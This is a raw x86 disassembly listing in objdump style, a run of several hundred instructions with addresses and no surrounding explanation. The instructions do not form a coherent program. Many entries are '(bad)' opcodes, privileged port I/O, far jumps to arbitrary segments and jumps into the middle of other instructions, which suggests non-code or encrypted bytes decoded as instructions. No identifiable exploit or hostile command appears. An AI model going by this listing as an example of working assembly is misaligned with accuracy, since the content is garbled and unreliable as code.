  41e6b8:	sbb    DWORD PTR [esi+0x71],ebx
  41e6bb:	daa    
  41e6bc:	call   FWORD PTR [edi+0x2d]
  41e6bf:	mov    eax,ds:0x906d1dde
  41e6c4:	push   0xa74aa720
  41e6c9:	pop    ecx
  41e6ca:	aam    0xdb
  41e6cc:	add    edx,DWORD PTR [edx]
  41e6ce:	cwde   
  41e6cf:	push   ecx
  41e6d0:	fcmove st,st(7)
  41e6d2:	inc    edi
  41e6d3:	jns    0x41e683
  41e6d5:	mov    bl,0xef
  41e6d7:	mov    ebp,0x164899dd
  41e6dc:	pop    ecx
  41e6dd:	sbb    BYTE PTR [edi],bh
  41e6df:	or     bh,ch
  41e6e1:	(bad)  
  41e6e2:	icebp  
  41e6e3:	mov    edx,0xc8e3bb6e
  41e6e8:	inc    ecx
  41e6e9:	bound  esp,QWORD PTR [edx-0x4a]
  41e6ec:	ins    DWORD PTR es:[edi],dx
  41e6ed:	ret    
  41e6ee:	imul   edx,DWORD PTR [ecx-0x3ba3aff3],0xffffffe7
  41e6f5:	aas    
  41e6f6:	out    0x87,eax
  41e6f8:	ins    BYTE PTR es:[edi],dx
  41e6f9:	cmp    DWORD PTR [edi+0x63],ecx
  41e6fc:	out    0x32,eax
  41e6fe:	out    0xf2,eax
  41e700:	sub    DWORD PTR [esi-0x54],ebp
  41e703:	loope  0x41e6f7
  41e705:	cmp    eax,0x619c6003
  41e70a:	call   0x3827bf05
  41e70f:	xor    BYTE PTR [esi],bh
  41e711:	jo     0x41e6b1
  41e713:	inc    esp
  41e714:	xlat   BYTE PTR ds:[ebx]
  41e715:	fcom   QWORD PTR [ebp-0x41dd71d6]
  41e71b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e71c:	push   ds
  41e71d:	enter  0xad78,0x7a
  41e721:	retf   0xf65
  41e724:	adc    al,0x54
  41e726:	es inc esp
  41e728:	xor    BYTE PTR [ebx-0x3790c14c],dh
  41e72e:	(bad)  
  41e730:	pop    es
  41e731:	dec    edi
  41e732:	mov    ds:0x4799ef6c,eax
  41e737:	lea    esi,[eax-0x6d]
  41e73a:	in     eax,0xf7
  41e73c:	jecxz  0x41e78d
  41e73e:	sub    bh,BYTE PTR [esi+0x7fc21790]
  41e744:	imul   BYTE PTR [ecx]
  41e746:	xor    BYTE PTR [ecx-0x69],0xd3
  41e74a:	sbb    eax,0xa2a8702b
  41e74f:	mov    ebp,DWORD PTR [esi+0x67904b41]
  41e755:	xchg   edx,eax
  41e756:	into   
  41e757:	xor    eax,0x75d5e77d
  41e75c:	add    BYTE PTR [ebp+0x26f2041c],al
  41e762:	pusha  
  41e763:	mov    ebx,0xd694b3b1
  41e768:	pop    eax
  41e769:	push   edx
  41e76a:	call   0x7734619c
  41e76f:	cs push 0x6d
  41e772:	fisubr WORD PTR [edi]
  41e774:	pop    edi
  41e775:	pop    ecx
  41e776:	in     eax,dx
  41e777:	(bad)  [eax-0x2b]
  41e77a:	sub    eax,0x64e8b0b8
  41e77f:	imul   BYTE PTR [edx+0x446604f2]
  41e785:	enter  0x5aa2,0x9d
  41e789:	sub    BYTE PTR [eax-0x1cc1d0ee],0x54
  41e790:	ins    DWORD PTR es:[edi],dx
  41e791:	not    DWORD PTR [edi+0x7b]
  41e794:	sub    al,bh
  41e796:	jnp    0x41e7a5
  41e798:	mov    eax,ds:0x8261ed13
  41e79d:	mov    BYTE PTR [ecx+0x0],al
  41e7a0:	sbb    ebx,DWORD PTR [esi]
  41e7a2:	pop    eax
  41e7a3:	cmp    ebx,DWORD PTR [ecx]
  41e7a5:	mov    DWORD PTR [edx+0x37],0xf0b41e4a
  41e7ac:	xchg   bh,al
  41e7ae:	bound  ecx,QWORD PTR [ebp-0xf]
  41e7b1:	push   0xffffffbb
  41e7b3:	das    
  41e7b4:	mov    ch,0xfc
  41e7b6:	test   DWORD PTR [edi+0x2689790b],0x8528bdd
  41e7c0:	inc    edi
  41e7c1:	inc    edi
  41e7c2:	cmp    DWORD PTR [edi-0x19],ebx
  41e7c5:	(bad)  
  41e7c6:	fisttp WORD PTR [ecx+0x14]
  41e7c9:	test   al,0x25
  41e7cb:	cmp    DWORD PTR [eax-0x5c],ebx
  41e7ce:	sub    eax,0x12266826
  41e7d3:	lea    ecx,[esi]
  41e7d5:	and    ah,al
  41e7d7:	jmp    0xb491:0xf2847357
  41e7de:	mov    ds:0x7283388a,al
  41e7e3:	sub    dl,BYTE PTR [ebx+ecx*1-0x42]
  41e7e7:	pop    eax
  41e7e8:	mov    edi,DWORD PTR [eax+eiz*8]
  41e7eb:	add    esi,DWORD PTR [esi+0x63]
  41e7ee:	stos   DWORD PTR es:[edi],eax
  41e7ef:	scas   al,BYTE PTR es:[edi]
  41e7f0:	loop   0x41e798
  41e7f2:	dec    ebx
  41e7f3:	or     eax,eax
  41e7f5:	cwde   
  41e7f6:	xor    BYTE PTR [ebx],ah
  41e7f8:	pop    ebp
  41e7f9:	xchg   dl,dh
  41e7fb:	mov    esi,0xe1902f4
  41e800:	or     BYTE PTR [eax+0x7183d30],bh
  41e806:	xchg   ecx,eax
  41e807:	push   ss
  41e808:	mov    ecx,DWORD PTR es:[ebx+edi*8-0x80]
  41e80d:	or     BYTE PTR [ebx],dl
  41e80f:	lock (bad) 
  41e812:	std    
  41e813:	jae    0x41e79e
  41e815:	inc    edi
  41e816:	jle    0x41e7d8
  41e818:	xor    al,0x22
  41e81a:	fs (bad) 
  41e81c:	xchg   esi,eax
  41e81d:	pop    ss
  41e81e:	rol    DWORD PTR [eax-0x4865ebfb],cl
  41e824:	or     al,ch
  41e826:	push   ecx
  41e827:	pusha  
  41e828:	jecxz  0x41e7d5
  41e82a:	retf   0x34d4
  41e82d:	mov    ds:0xcc065690,eax
  41e832:	inc    ebp
  41e833:	push   0x418796d9
  41e838:	out    0x33,eax
  41e83a:	push   ebx
  41e83b:	jno    0x41e7d0
  41e83d:	les    esp,FWORD PTR [ecx-0x3308f9ab]
  41e843:	mov    bl,0xf1
  41e845:	jb     0x41e864
  41e847:	xchg   edx,eax
  41e848:	pop    ds
  41e849:	push   esp
  41e84a:	out    dx,al
  41e84b:	dec    ebx
  41e84c:	js     0x41e83f
  41e84e:	jmp    0x41e885
  41e850:	mov    al,gs:0x8b184c1
  41e856:	cld    
  41e857:	push   cs
  41e858:	push   eax
  41e859:	or     bl,BYTE PTR [ebx+0x3f]
  41e85c:	sub    al,0x5c
  41e85e:	inc    eax
  41e85f:	enter  0x5eb0,0x77
  41e863:	xor    bh,BYTE PTR fs:[ecx+0x3d]
  41e867:	loope  0x41e8d4
  41e869:	xlat   BYTE PTR ds:[ebx]
  41e86a:	das    
  41e86b:	jb     0x41e80b
  41e86d:	out    dx,al
  41e86e:	xlat   BYTE PTR ds:[ebx]
  41e86f:	(bad)  
  41e870:	pop    eax
  41e871:	xchg   esi,eax
  41e872:	add    BYTE PTR ds:0x8f9cf06d,ah
  41e878:	jl     0x41e881
  41e87a:	(bad)  
  41e87c:	jmp    0x72e0:0x98e8a036
  41e883:	cld    
  41e884:	mov    ebp,0x5a5e9996
  41e889:	ficomp WORD PTR [eax-0x34]
  41e88c:	xchg   DWORD PTR [eax-0x27],ebx
  41e88f:	or     eax,0x6028aa7
  41e894:	sub    esp,0xa23b0ec5
  41e89a:	ins    DWORD PTR es:[edi],dx
  41e89b:	jmp    0x41e8e1
  41e89d:	add    dh,dl
  41e89f:	retf   0x337b
  41e8a2:	nop
  41e8a3:	mov    BYTE PTR [edi+0x4c8f274d],dl
  41e8a9:	cmp    edi,DWORD PTR [esi]
  41e8ab:	jge    0x41e88c
  41e8ad:	cld    
  41e8ae:	or     al,0xaf
  41e8b0:	out    0x6d,eax
  41e8b2:	mov    DWORD PTR [ebx-0x5c4fc406],0xe0781021
  41e8bc:	dec    ebx
  41e8bd:	test   DWORD PTR [edi-0x7b614bbc],0x7a9b782
  41e8c7:	iret   
  41e8c8:	fdiv   QWORD PTR [esi-0x4d]
  41e8cb:	int3   
  41e8cc:	pop    edi
  41e8cd:	inc    eax
  41e8ce:	or     edx,esp
  41e8d0:	mov    WORD PTR [ebp+0x5e731625],?
  41e8d6:	lods   al,BYTE PTR ds:[esi]
  41e8d7:	mov    ds:0x163a3c5e,eax
  41e8dc:	js     0x41e8bd
  41e8de:	pop    ecx
  41e8df:	inc    ebp
  41e8e0:	cmp    DWORD PTR [edx+0x69bd1ef2],edx
  41e8e6:	imul   ebp,DWORD PTR [ebx+0x1c],0x54
  41e8ea:	mov    ch,0xd4
  41e8ec:	mov    DWORD PTR [ebp+0x14],0xef198e9c
  41e8f3:	push   ebp
  41e8f4:	rcr    BYTE PTR [ebx-0xb],cl
  41e8f7:	or     eax,0xb144fe5b
  41e8fc:	xlat   BYTE PTR ds:[ebx]
  41e8fd:	add    al,0x4e
  41e8ff:	jns    0x41e94f
  41e901:	adc    dl,BYTE PTR [ebx+ebx*2-0x63]
  41e905:	repz pop edx
  41e907:	pop    eax
  41e908:	iret   
  41e909:	mov    esi,0x4085fbd2
  41e90e:	stc    
  41e90f:	stos   DWORD PTR es:[edi],eax
  41e910:	sub    al,0x6
  41e912:	stos   BYTE PTR es:[edi],al
  41e913:	shl    DWORD PTR [edx-0x16],1
  41e916:	jl     0x41e932
  41e918:	popa   
  41e919:	cmp    eax,ecx
  41e91b:	pushf  
  41e91c:	adc    ah,al
  41e91e:	jecxz  0x41e949
  41e920:	adc    al,0xe1
  41e922:	fisub  WORD PTR [eax-0x6e]
  41e925:	pop    esp
  41e926:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e927:	inc    edi
  41e928:	mov    cl,0x2e
  41e92a:	pop    esp
  41e92b:	pop    ds
  41e92c:	or     ah,BYTE PTR [esi+0x2d]
  41e92f:	xor    DWORD PTR [edi-0x74],0x5be6662
  41e936:	imul   edi,DWORD PTR [ebx],0xda5f8e77
  41e93c:	dec    ebp
  41e93d:	sub    dh,BYTE PTR [esi-0x4]
  41e940:	or     BYTE PTR [edi+ebp*2],0x5f
  41e944:	outs   dx,BYTE PTR ds:[esi]
  41e945:	sbb    ch,BYTE PTR [ecx+0x1a87adcc]
  41e94b:	sahf   
  41e94c:	inc    eax
  41e94d:	sub    eax,0x9dc5268f
  41e952:	cli    
  41e953:	xchg   edi,eax
  41e954:	ficom  WORD PTR [eax-0x4983f6f2]
  41e95a:	test   al,0xb
  41e95c:	add    BYTE PTR [ebp+0x44],0x54
  41e960:	push   ecx
  41e961:	mov    cl,0xf1
  41e963:	repz clc 
  41e965:	sti    
  41e966:	sub    BYTE PTR [esi],0x94
  41e969:	cmc    
  41e96a:	leave  
  41e96b:	mov    bh,0xff
  41e96d:	xchg   edi,eax
  41e96e:	mov    al,BYTE PTR [esi+0x3dffd99e]
  41e974:	dec    ecx
  41e975:	lahf   
  41e976:	and    edi,DWORD PTR [edi+0x370acf8e]
  41e97c:	mov    DWORD PTR [ecx+0x78de1efc],esp
  41e982:	aad    0x2f
  41e984:	xor    bl,BYTE PTR [ebx-0x1938fc10]
  41e98a:	rcr    bl,1
  41e98c:	adc    eax,edx
  41e98e:	loop   0x41e9cc
  41e990:	pop    edi
  41e991:	inc    ebx
  41e992:	call   0x7891:0xe34ec63c
  41e999:	std    
  41e99a:	jle    0x41e9cf
  41e99c:	sub    cl,bl
  41e99e:	inc    edi
  41e99f:	fadd   QWORD PTR [ebp-0xab4a341]
  41e9a5:	pop    ds
  41e9a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e9a7:	out    0x77,eax
  41e9a9:	jno    0x41e944
  41e9ab:	xor    BYTE PTR [eax],dl
  41e9ad:	outs   dx,DWORD PTR ds:[esi]
  41e9ae:	push   0xffffffd9
  41e9b0:	xchg   edi,eax
  41e9b1:	lahf   
  41e9b2:	mov    al,ds:0xd513c37e
  41e9b7:	adc    eax,0x458c4b2d
  41e9bc:	jg     0x41e955
  41e9be:	sbb    ebp,esp
  41e9c0:	rcr    BYTE PTR [eax+0x545522cb],0xa0
  41e9c7:	add    al,0xfa
  41e9c9:	adc    edx,DWORD PTR es:[ebp-0x1e]
  41e9cd:	ss test al,0x80
  41e9d0:	add    cl,BYTE PTR [ebx-0x42]
  41e9d3:	xor    ebx,DWORD PTR [ebp-0x2]
  41e9d6:	repnz mov ds:0x32f9c07c,eax
  41e9dc:	mov    ecx,0xc2f74867
  41e9e1:	or     cl,BYTE PTR ds:0xc5fe4f60
  41e9e7:	sbb    DWORD PTR [ecx-0x365f5ae3],0xfffffffb
  41e9ee:	shl    edx,cl
  41e9f0:	call   0xd1d6:0xa7871de2
  41e9f7:	mov    ds:0xd1204f43,eax
  41e9fc:	stos   DWORD PTR es:[edi],eax
  41e9fd:	or     ebx,DWORD PTR [esi]
  41e9ff:	mov    dl,0x4e
  41ea01:	ficom  DWORD PTR [ecx]
  41ea03:	retf   
  41ea04:	in     eax,0xbf
  41ea06:	call   0xecced2bf
  41ea0b:	ja     0x41e9de
  41ea0d:	jmp    0x41ea4d
  41ea0f:	and    ebx,DWORD PTR [ebx+0x276a3872]
  41ea15:	in     eax,0x7
  41ea17:	mov    dh,0xde
  41ea19:	mov    al,ds:0x456155ee
  41ea1e:	cmp    dl,BYTE PTR [eax+0xf198093]
  41ea24:	pop    edi
  41ea25:	jae    0x41e9be
  41ea27:	xlat   BYTE PTR ds:[ebx]
  41ea28:	inc    edx
  41ea29:	neg    BYTE PTR [ebx+0x23610433]
  41ea2f:	in     al,0xa4
  41ea31:	xor    al,dh
  41ea33:	sbb    DWORD PTR [esi],eax
  41ea35:	and    ebx,ecx
  41ea37:	outs   dx,DWORD PTR ds:[esi]
  41ea38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea39:	mov    edi,0xf3254fba
  41ea3e:	sub    esi,ebp
  41ea40:	sahf   
  41ea41:	xchg   BYTE PTR [edx+0x634e3b9f],bh
  41ea47:	add    BYTE PTR [esi-0x60177ee6],ch
  41ea4d:	sub    eax,0x9437be7d
  41ea52:	(bad)  
  41ea53:	jle    0x41ea07
  41ea55:	and    BYTE PTR [eax-0x482cad9c],bl
  41ea5b:	ins    BYTE PTR es:[edi],dx
  41ea5c:	pop    esp
  41ea5d:	push   ebp
  41ea5e:	adc    DWORD PTR [eax],esi
  41ea60:	in     eax,dx
  41ea61:	stc    
  41ea62:	inc    ecx
  41ea63:	or     DWORD PTR [edi+0x62],eax
  41ea66:	and    esp,esp
  41ea68:	scas   al,BYTE PTR es:[edi]
  41ea69:	mov    ebx,0x8310d16d
  41ea6e:	ret    0xd586
  41ea71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea72:	cmp    DWORD PTR [ebx+0x7b73c12e],eax
  41ea78:	mov    di,WORD PTR [edx+0x1c]
  41ea7c:	(bad)  
  41ea7d:	jns    0x41eaa4
  41ea7f:	outs   dx,DWORD PTR ds:[esi]
  41ea80:	add    ebx,ecx
  41ea82:	(bad)  
  41ea83:	xor    eax,ebp
  41ea85:	inc    ebp
  41ea86:	outs   dx,BYTE PTR ds:[esi]
  41ea87:	pop    edi
  41ea88:	or     esp,edx
  41ea8a:	lods   al,BYTE PTR ds:[esi]
  41ea8b:	mov    DWORD PTR [eax-0x77],ecx
  41ea8e:	push   edx
  41ea8f:	or     BYTE PTR [ebp+0x7df79406],0xc4
  41ea96:	lods   al,BYTE PTR ds:[esi]
  41ea97:	aam    0xfa
  41ea99:	mov    cl,BYTE PTR [ebp+0x1a51c5c1]
  41ea9f:	addr16 repz (bad) [bp+si+0x137b]
  41eaa6:	jae    0x41ea4c
  41eaa8:	ret    0x63b3
  41eaab:	or     al,0x58
  41eaad:	dec    ebx
  41eaae:	mov    ebx,0x1579e9eb
  41eab3:	pop    es
  41eab4:	xor    DWORD PTR [ebx+0x4ad89f64],0x3ee730aa
  41eabe:	pop    ecx
  41eabf:	pop    eax
  41eac0:	mov    al,0x5
  41eac2:	and    ebp,ebp
  41eac4:	or     BYTE PTR [ecx+0x69],bh
  41eac7:	inc    ebx
  41eac8:	xchg   edi,eax
  41eac9:	mov    esi,0xd2e8ed05
  41eace:	add    eax,0xe88919eb
  41ead3:	ficom  DWORD PTR [ebp-0x4]
  41ead6:	into   
  41ead7:	jo     0x41eac0
  41ead9:	rcr    ecx,0x95
  41eadc:	jnp    0x41eb39
  41eade:	and    DWORD PTR [ecx+eiz*8-0x571458bf],ecx
  41eae5:	push   ss
  41eae6:	and    eax,0xd2291689
  41eaeb:	mov    WORD PTR [ebx],fs
  41eaed:	pop    ebx
  41eaee:	mov    esi,0x8161705f
  41eaf3:	scas   al,BYTE PTR es:[edi]
  41eaf4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eaf5:	push   0xc2320a10
  41eafa:	scas   eax,DWORD PTR es:[edi]
  41eafb:	test   BYTE PTR [esi+0xf],bh
  41eafe:	(bad)  
  41eaff:	fild   QWORD PTR [edx]
  41eb01:	int    0x88
  41eb03:	ror    BYTE PTR [esi],1
  41eb05:	sbb    al,0x7f
  41eb07:	(bad)  
  41eb08:	ss (bad) 
  41eb0a:	(bad)  
  41eb0b:	sar    esp,cl
  41eb0d:	fisttp WORD PTR [ebp+ebp*4+0x478211f3]
  41eb14:	mov    edi,0xba58ae4b
  41eb19:	into   
  41eb1a:	clc    
  41eb1b:	fnstcw WORD PTR [ebx-0x6dfeb72c]
  41eb21:	aas    
  41eb22:	dec    esi
  41eb23:	iret   
  41eb24:	arpl   WORD PTR [ecx+edi*1],di
  41eb27:	repz mov edi,0xc0ea2e63
  41eb2d:	push   ebx
  41eb2e:	pushf  
  41eb2f:	mov    bl,0xa3
  41eb31:	cmp    eax,0x5b2fc2e9
  41eb36:	gs inc ebx
  41eb38:	das    
  41eb39:	and    eax,0x5a922be8
  41eb3e:	dec    esp
  41eb3f:	fstp   QWORD PTR [ebx]
  41eb41:	sbb    BYTE PTR ss:[edx-0xb092e92],0x30
  41eb49:	dec    ecx
  41eb4a:	and    al,0x11
  41eb4c:	in     al,dx
  41eb4d:	xchg   edx,eax
  41eb4e:	mov    esi,0xeacd4504
  41eb53:	inc    ebp
  41eb54:	sub    DWORD PTR ss:[ebx],0x41
  41eb58:	ret    0x19f
  41eb5b:	dec    esp
  41eb5c:	repz jno 0x41eaf4
  41eb5f:	ds jmp 0x41eb6f
  41eb62:	xlat   BYTE PTR ds:[ebx]
  41eb63:	(bad)  
  41eb64:	scas   al,BYTE PTR es:[di]
  41eb66:	mov    al,ds:0xfd4884c2
  41eb6b:	inc    ebx
  41eb6c:	jg     0x41ebb8
  41eb6e:	lea    edi,[edi+edx*4+0x2]
  41eb72:	shr    DWORD PTR [edx+esi*1+0x67c48d79],0x85
  41eb7a:	mov    al,BYTE PTR [edx-0x5fe951d7]
  41eb80:	mov    edi,0x680f0f76
  41eb85:	scas   al,BYTE PTR es:[edi]
  41eb86:	test   al,0xdc
  41eb88:	cld    
  41eb89:	jb     0x41eb36
  41eb8b:	and    ah,cl
  41eb8d:	pop    esi
  41eb8e:	int    0x1d
  41eb90:	(bad)  
  41eb91:	ficom  DWORD PTR [ebx-0x3ec256c4]
  41eb97:	sbb    dh,BYTE PTR [edx-0x7b]
  41eb9a:	jle    0x41eb7e
  41eb9c:	ret    
  41eb9d:	adc    BYTE PTR [edx+0x61],0xa2
  41eba1:	add    ah,0xe0
  41eba4:	nop
  41eba5:	lods   eax,DWORD PTR ds:[esi]
  41eba6:	ret    
  41eba7:	mov    ds:0xf8eb68cd,al
  41ebac:	daa    
  41ebad:	mov    edi,0x7a4ec4b5
  41ebb2:	pop    ebx
  41ebb3:	sbb    ebx,0xdfdfbd2f
  41ebb9:	ficomp DWORD PTR [esi+0xc7e5126]
  41ebbf:	call   0x33f0:0xd6dd02c5
  41ebc6:	js     0x41ebb5
  41ebc8:	jae    0x41ec02
  41ebca:	mov    es,WORD PTR [ebx]
  41ebcc:	fnsave [esi]
  41ebce:	mov    ebx,0xb6090042
  41ebd3:	ror    ebp,1
  41ebd5:	(bad)  
  41ebd6:	clc    
  41ebd7:	add    BYTE PTR [ecx+0x766c163],cl
  41ebdd:	int3   
  41ebde:	je     0x41ec49
  41ebe0:	popa   
  41ebe1:	shl    BYTE PTR [edx+0x19],1
  41ebe4:	push   ds
  41ebe5:	fcmovbe st,st(4)
  41ebe7:	sahf   
  41ebe8:	test   al,0xa2
  41ebea:	mov    ds:0x18eb1fab,eax
  41ebef:	xor    BYTE PTR [ebp+ebx*8+0x38],dh
  41ebf3:	push   ecx
  41ebf4:	xor    eax,0x594f5f76
  41ebf9:	clc    
  41ebfa:	push   esp
  41ebfb:	or     dl,BYTE PTR [ebx]
  41ebfd:	(bad)  
  41ebfe:	pop    ss
  41ebff:	out    0x67,al
  41ec01:	jo     0x41ec6d
  41ec03:	xchg   edi,eax
  41ec04:	xchg   edx,eax
  41ec05:	dec    esi
  41ec06:	repnz lods eax,DWORD PTR ds:[esi]
  41ec08:	leave  
  41ec09:	sbb    al,0xa1
  41ec0b:	iret   
  41ec0c:	or     al,0x7a
  41ec0e:	shr    bl,0xfb
  41ec11:	dec    edi
  41ec12:	test   ebp,esi
  41ec14:	jno    0x41ec77
  41ec16:	dec    esi
  41ec17:	sub    ecx,DWORD PTR ds:0xb7074023
  41ec1d:	xor    eax,0x4397f898
  41ec22:	xor    al,0x7b
  41ec24:	scas   al,BYTE PTR es:[edi]
  41ec25:	in     al,0xea
  41ec27:	push   ss
  41ec28:	xchg   edi,eax
  41ec29:	and    bl,dh
  41ec2b:	retf   
  41ec2c:	xor    ebp,esi
  41ec2e:	xchg   esp,eax
  41ec2f:	int3   
  41ec30:	adc    DWORD PTR [ecx-0x4b],edi
  41ec33:	jmp    0xd5e451d6
  41ec38:	inc    edx
  41ec39:	jmp    0x41ec62
  41ec3b:	test   ecx,ecx
  41ec3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec3e:	pop    edx
  41ec3f:	test   al,0xef
  41ec41:	pop    ds
  41ec42:	xor    al,0x78
  41ec44:	push   edi
  41ec45:	add    DWORD PTR [edx],ecx
  41ec47:	add    al,0x61
  41ec49:	jecxz  0x41ec3b
  41ec4b:	mov    ecx,0xf457248c
  41ec50:	idiv   DWORD PTR [edi+eiz*2]
  41ec53:	and    eax,ecx
  41ec55:	pop    ecx
  41ec56:	sbb    ah,BYTE PTR [edi+0x5d]
  41ec59:	mov    DWORD PTR [eax],edi
  41ec5b:	push   ds
  41ec5c:	jo     0x41ec61
  41ec5e:	fmul   QWORD PTR [esp+edx*8]
  41ec61:	pop    ds
  41ec62:	jl     0x41ec27
  41ec64:	mov    al,BYTE PTR [ebp-0x22]
  41ec67:	jno    0x41ec08
  41ec69:	sahf   
  41ec6a:	jl     0x41ec24
  41ec6c:	mov    esi,0xfceda666
  41ec71:	xchg   ecx,eax
  41ec72:	mul    BYTE PTR [esi+0x5de3fe24]
  41ec78:	lods   al,BYTE PTR ds:[esi]
  41ec79:	push   ss
  41ec7a:	jnp    0x41ec48
  41ec7c:	scas   eax,DWORD PTR es:[edi]
  41ec7d:	inc    edx
  41ec7e:	mov    dl,0x7d
  41ec80:	out    dx,al
  41ec81:	dec    eax
  41ec82:	xchg   ebp,eax
  41ec83:	push   es
  41ec84:	cmp    DWORD PTR ds:0xa65c7afd,ebx
  41ec8a:	rcr    BYTE PTR [edx+0x1a],cl
  41ec8d:	popa   
  41ec8e:	inc    esi
  41ec8f:	imul   edi,DWORD PTR [eax-0x20],0xffffffc9
  41ec93:	xchg   ch,cl
  41ec95:	jo     0x41ec86
  41ec97:	stos   DWORD PTR es:[edi],eax
  41ec98:	adc    ecx,ecx
  41ec9a:	sub    ah,BYTE PTR [edx]
  41ec9c:	ror    DWORD PTR [esi],0x1d
  41ec9f:	out    0xb0,al
  41eca1:	sub    edi,ebp
  41eca3:	sub    al,0x78
  41eca5:	or     eax,DWORD PTR [ecx]
  41eca7:	pushf  
  41eca8:	rcl    BYTE PTR [ebp-0x37],cl
  41ecab:	lea    edx,[esi-0x61]
  41ecae:	pop    ds
  41ecaf:	jge    0x41ec4c
  41ecb1:	and    ebx,esi
  41ecb3:	int3   
  41ecb4:	mov    esp,0x5889292d
  41ecb9:	dec    ecx
  41ecba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ecbb:	push   0xd53654ba
  41ecc0:	das    
  41ecc1:	retf   0xc2eb
  41ecc4:	jecxz  0x41ece9
  41ecc6:	setl   BYTE PTR [eax+0x7c]
  41ecca:	imul   edi,ebx,0x52
  41eccd:	stos   DWORD PTR es:[edi],eax
  41ecce:	jno    0x41ecfe
  41ecd0:	or     al,0x64
  41ecd2:	fisttp DWORD PTR [ebp-0x6d062a7b]
  41ecd8:	mov    eax,0x4800b6a2
  41ecdd:	cmc    
  41ecde:	fsubr  DWORD PTR [eax+0x48]
  41ece1:	pusha  
  41ece2:	dec    edx
  41ece3:	shr    bl,cl
  41ece5:	inc    ebx
  41ece6:	and    ebp,DWORD PTR fs:[eax+0x341bee71]
  41eced:	sbb    al,bh
  41ecef:	push   0xffffffa0
  41ecf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ecf2:	push   ecx
  41ecf3:	jno    0x41ed1e
  41ecf5:	scas   eax,DWORD PTR es:[edi]
  41ecf6:	push   ecx
  41ecf7:	push   0xffffff83
  41ecf9:	sbb    DWORD PTR [eax+ecx*4],0xab3c5d9f
  41ed00:	sbb    al,0x48
  41ed02:	cmp    esp,DWORD PTR [ebx-0x3cf2d1b2]
  41ed08:	es stos DWORD PTR es:[edi],eax
  41ed0a:	jmp    0xcd19:0x1155a44b
  41ed11:	inc    esp
  41ed12:	stc    
  41ed13:	je     0x41ed48
  41ed15:	in     eax,0x2f
  41ed17:	fs jne 0x41eca7
  41ed1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed1b:	or     DWORD PTR [eax-0x128f5f21],esi
  41ed21:	repz scas eax,DWORD PTR es:[edi]
  41ed23:	rol    BYTE PTR [edi-0x58],0xd3
  41ed27:	or     eax,0x923fb549
  41ed2c:	jb     0x41ed9f
  41ed2e:	repz das 
  41ed30:	fdivr  QWORD PTR [ebx-0x1fe38eae]
  41ed36:	and    edx,DWORD PTR [edi+0x3e]
  41ed39:	mov    ebp,0xe55a1be5
  41ed3e:	stc    
  41ed3f:	cmp    eax,0x4d555c73
  41ed44:	bound  edx,QWORD PTR [edx+0x1]
  41ed47:	loopne 0x41ed38
  41ed49:	xchg   esp,eax
  41ed4a:	sti    
  41ed4b:	lahf   
  41ed4c:	xor    eax,0xf7c489de
  41ed51:	add    DWORD PTR [ecx+0xc3a994c],esp
  41ed57:	ss nop
  41ed59:	fsubp  st(4),st
  41ed5b:	add    BYTE PTR [edi+0x38db4ab9],cl
  41ed61:	mov    ds:0x6800c952,ax
  41ed67:	jbe    0x41edb1
  41ed69:	sub    BYTE PTR [edx-0xb261f60],cl
  41ed6f:	sub    DWORD PTR [edx+0x46cf595a],0xffffff8e
  41ed76:	stos   BYTE PTR es:[edi],al
  41ed77:	xchg   edx,eax
  41ed78:	add    al,0x21
  41ed7a:	xor    eax,0xbbeba859
  41ed7f:	cmp    ebp,ebp
  41ed81:	aad    0x35
  41ed83:	loope  0x41ed64
  41ed85:	enter  0x2aad,0xee
  41ed89:	dec    eax
  41ed8a:	outs   dx,DWORD PTR ds:[esi]
  41ed8b:	cli    
  41ed8c:	cdq    
  41ed8d:	enter  0xd828,0x85
  41ed91:	lods   eax,DWORD PTR ds:[esi]
  41ed92:	shl    DWORD PTR [ebp+ebx*1-0x24],1
  41ed96:	outs   dx,DWORD PTR ds:[esi]
  41ed97:	xor    eax,0x31f333d
  41ed9c:	xchg   ecx,eax
  41ed9d:	(bad)  
  41ed9e:	xchg   edi,eax
  41ed9f:	sub    edi,DWORD PTR [esi-0x299265ad]
  41eda5:	or     BYTE PTR [edx],ah
  41eda7:	les    ebx,FWORD PTR [ecx]
  41eda9:	pop    es
  41edaa:	hlt    
  41edab:	(bad)  ds:0xa716ddbf
  41edb1:	cmp    eax,0xc2db9141
  41edb6:	mov    ebx,0x115b1871
  41edbb:	sahf   
  41edbc:	xchg   ecx,eax
  41edbd:	rol    BYTE PTR [ecx+0x20ce8043],1
  41edc3:	push   esi
  41edc4:	sbb    BYTE PTR [eax+0x53],0x59
  41edc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41edc9:	mov    ss,WORD PTR [ebx-0x4f]
  41edcc:	sub    eax,0x12c3965f
  41edd1:	dec    BYTE PTR [ecx-0x8]
  41edd4:	cmp    bl,0x6c
  41edd7:	sbb    eax,ebp
  41edd9:	je     0x41edec
  41eddb:	pop    ebx
  41eddc:	sti    
  41eddd:	inc    esp
  41edde:	push   ebx
  41eddf:	jp     0x41ed9f
  41ede1:	leave  
  41ede2:	stos   DWORD PTR es:[edi],eax
  41ede3:	add    DWORD PTR [eax+ecx*2+0x10],esi
  41ede7:	cmc    
  41ede8:	xchg   edi,eax
  41ede9:	outs   dx,BYTE PTR ds:[esi]
  41edea:	dec    eax
  41edeb:	mov    ch,BYTE PTR [ecx]
  41eded:	xchg   esi,eax
  41edee:	pop    ebx
  41edef:	xchg   ebx,eax
  41edf0:	push   esi
  41edf1:	pop    esp
  41edf2:	cs icebp 
  41edf4:	rcl    BYTE PTR [ebp-0x54],1
  41edf7:	pop    ecx
  41edf8:	popa   
  41edf9:	adc    BYTE PTR [esi+0x49143e74],0x67
  41ee00:	mov    al,0xdc
  41ee02:	(bad)  
  41ee03:	mov    ecx,0x7cdff612
  41ee08:	(bad)  
  41ee0a:	mov    al,ds:0xb6a7c2c
  41ee0f:	fs pop edi
  41ee11:	mov    ch,0xbe
  41ee13:	stc    
